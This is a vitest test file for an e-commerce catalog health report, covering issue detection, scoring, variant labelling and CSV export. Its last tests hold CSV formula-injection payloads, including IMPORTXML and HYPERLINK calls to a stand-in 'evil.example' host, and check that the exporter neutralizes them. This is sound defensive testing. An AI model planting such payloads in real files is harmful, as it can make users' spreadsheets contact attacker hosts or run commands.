import { describe, expect, it } from "vitest";
import { buildHealthReport, ISSUE_TO_RULE } from "./health-rules";
import { issuesToCsv } from "./csv";
import { sampleProducts } from "./sample-products";
import { buildProduct, buildVariant } from "@/lib/mutations/mutation-fixtures";

const report = buildHealthReport(sampleProducts, new Date("2026-07-06T00:00:00.000Z"));

describe("buildHealthReport", () => {
  it("counts active products and variants", () => {
    expect(report.productCount).toBe(3);
    expect(report.variantCount).toBe(4);
  });

  it("detects missing merchant-critical fields", () => {
    expect(report.issueCountsByCode.missing_sku).toBe(1);
    expect(report.issueCountsByCode.missing_barcode).toBe(1);
    expect(report.issueCountsByCode.missing_image).toBe(1);
    expect(report.issueCountsByCode.missing_description).toBe(1);
    expect(report.issueCountsByCode.missing_category).toBe(1);
    expect(report.issueCountsByCode.missing_brand).toBe(1);
    expect(report.issueCountsByCode.missing_vendor).toBe(2);
  });

  it("detects duplicate identifiers across active variants", () => {
    expect(report.issueCountsByCode.duplicate_sku).toBe(2);
    expect(report.issueCountsByCode.duplicate_barcode).toBe(2);
  });

  it("detects stock and pricing risks", () => {
    expect(report.issueCountsByCode.zero_stock_blocked).toBe(1);
    expect(report.issueCountsByCode.missing_price).toBe(1);
    expect(report.criticalCount).toBeGreaterThan(0);
    expect(report.score).toBeLessThan(100);
  });

  it("keeps configurable low-stock monitoring disabled by default", () => {
    expect(report.issueCountsByCode.low_stock).toBe(0);
    expect(report).not.toHaveProperty("lowStockThreshold");
  });

  it("adds a separate warning for positive stock at or below the configured threshold", () => {
    const configured = buildHealthReport(
      sampleProducts,
      new Date("2026-07-06T00:00:00.000Z"),
      { lowStockThreshold: 5 },
    );

    expect(configured.issueCountsByCode.low_stock).toBe(1);
    expect(configured.issues).toContainEqual(
      expect.objectContaining({
        code: "low_stock",
        severity: "warning",
        productId: "prod-003",
        variantId: "var-004",
        value: 2,
      }),
    );
    expect(configured.issueCountsByCode.zero_stock_blocked).toBe(1);
  });

  it("reports blocked out-of-stock variants under a name that matches what is measured", () => {
    expect(report.outOfStockBlockedCount).toBe(report.issueCountsByCode.zero_stock_blocked);
    expect(report.outOfStockBlockedCount).toBe(1);
    // No configurable low-stock threshold exists yet, so no field may imply one.
    expect(report).not.toHaveProperty("lowStockRiskCount");
  });

  it("preserves health score and rule behaviour while the stock metric is renamed", () => {
    // 5 critical x 7 + 6 warning x 4 = 59 penalty, so 100 - 59 * 0.9 rounds to 47.
    expect(report.score).toBe(47);
    expect(report.criticalCount).toBe(5);
    expect(report.warningCount).toBe(6);
    expect(report.infoCount).toBe(0);
    expect(report.ruleSummaries.find((rule) => rule.code === "out_of_stock")?.count).toBe(1);
  });

  /**
   * The score is the number a merchant is judged by, so it may only move for problems they can
   * actually find. This fixture also trips missing_category, missing_brand and missing_vendor,
   * none of which roll up into a rule card — counting them would leave a store unable to reach
   * 100 no matter how many listed problems it fixed, with nothing on screen explaining why.
   */
  it("scores and counts only the issues a merchant can see on the panel", () => {
    const invisible = report.issues.filter((issue) => ISSUE_TO_RULE[issue.code] === undefined);
    expect(invisible.length, "fixture must still exercise unmapped codes").toBeGreaterThan(0);
    expect(new Set(invisible.map((issue) => issue.code))).toEqual(
      new Set(["missing_category", "missing_brand", "missing_vendor"]),
    );

    expect(report.issueCount).toBe(report.issues.length - invisible.length);
    expect(report.criticalCount + report.warningCount + report.infoCount).toBe(report.issueCount);

    // Detection itself is untouched: the unmapped codes are still available to diagnostics and
    // to the low-stock alerting path, they simply no longer move a merchant-facing number.
    expect(report.issueCountsByCode.missing_category).toBe(1);
  });

  it("surfaces barcode faults as their own rules, which the app store listing promises", () => {
    expect(report.ruleSummaries.find((rule) => rule.code === "missing_barcode")?.count).toBe(1);
    expect(report.ruleSummaries.find((rule) => rule.code === "same_barcode")?.count).toBe(2);
    expect(report.productRows.some((row) => row.mistakes.includes("Barkod Eksik"))).toBe(true);
    expect(report.productRows.some((row) => row.mistakes.includes("Aynı Barkod"))).toBe(true);
  });

  it("rolls a missing description into the same rule as a useless one", () => {
    expect(report.issueCountsByCode.missing_description).toBe(1);
    expect(ISSUE_TO_RULE.missing_description).toBe("weird_description");
    expect(report.ruleSummaries.find((rule) => rule.code === "weird_description")?.count).toBe(2);
  });

  it("builds mistake finder rule summaries and product rows", () => {
    expect(report.affectedProductCount).toBeGreaterThan(0);
    expect(report.ruleSummaries.find((rule) => rule.code === "incorrect_price")?.count).toBe(1);
    expect(report.ruleSummaries.find((rule) => rule.code === "out_of_stock")?.count).toBe(1);
    expect(report.ruleSummaries.find((rule) => rule.code === "same_sku")?.count).toBe(2);
    expect(report.productRows.some((row) => row.productName === "Silver Ring" && row.mistakes.includes("Hatalı Fiyat"))).toBe(true);
  });
});

describe("variant labels", () => {
  it("names a variant by its SKU when it has one", () => {
    const report = buildHealthReport([
      buildProduct({
        variants: [buildVariant({ id: "v1", sku: "AAA" }), buildVariant({ id: "v2", sku: "BBB" })],
      }),
    ]);

    const labels = report.issues.filter((issue) => issue.variantId).map((issue) => issue.variantLabel);
    expect(labels).toContain("AAA");
    expect(labels).toContain("BBB");
  });

  it("never falls back to a raw variant id for a variant with no SKU", () => {
    const report = buildHealthReport([
      buildProduct({
        variants: [
          buildVariant({ id: "0f0b2b0e-1111-2222-3333-444455556666", sku: null }),
          buildVariant({ id: "0f0b2b0e-7777-8888-9999-aaaabbbbcccc", sku: null }),
        ],
      }),
    ]);

    const missingSku = report.issues.filter((issue) => issue.code === "missing_sku");
    expect(missingSku).toHaveLength(2);
    expect(missingSku.map((issue) => issue.variantLabel)).toEqual(["Varyant 1", "Varyant 2"]);
    for (const issue of missingSku) {
      expect(issue.variantLabel).not.toBe(issue.variantId);
    }
  });

  it("leaves a single-variant product unlabelled, because its name already says which it is", () => {
    const report = buildHealthReport([
      buildProduct({ variants: [buildVariant({ id: "only-variant", sku: null })] }),
    ]);

    const missingSku = report.issues.find((issue) => issue.code === "missing_sku");
    expect(missingSku?.variantLabel).toBeUndefined();
  });
});

describe("issuesToCsv", () => {
  it("exports issue rows as csv", () => {
    const csv = issuesToCsv(report.issues);
    expect(csv.split("\n")[0]).toBe("severity,code,productName,productId,variantLabel,variantId,value,message");
    expect(csv).toContain("duplicate_sku");
    expect(csv).toContain("Silver Ring");
  });

  it("neutralizes spreadsheet formulas in every upstream-controlled text cell", () => {
    const csv = issuesToCsv([
      {
        ...report.issues[0],
        productName: "=SUM(1,1)",
        productId: "+cmd",
        variantLabel: "-1+1",
        variantId: "@IMPORTXML(https://evil.example)",
        value: "  =HYPERLINK(https://evil.example)",
        message: "\t=cmd",
      },
    ]);

    expect(csv).toContain("'=SUM(1,1)");
    expect(csv).toContain("'+cmd");
    expect(csv).toContain("'-1+1");
    expect(csv).toContain("'@IMPORTXML");
    expect(csv).toContain("'  =HYPERLINK");
    expect(csv).toContain("'\t=cmd");
  });

  it("neutralizes CR/LF-prefixed formulas before preserving CSV quotes and commas", () => {
    const csv = issuesToCsv([
      {
        ...report.issues[0],
        productName: "\r=CMD",
        value: " \t-1+1",
        message: "\n+CMD,\"argument\"",
      },
    ]);

    expect(csv).toContain(`"'\r=CMD"`);
    expect(csv).toContain("' \t-1+1");
    expect(csv).toContain(`"'\n+CMD,""argument"""`);
  });
});
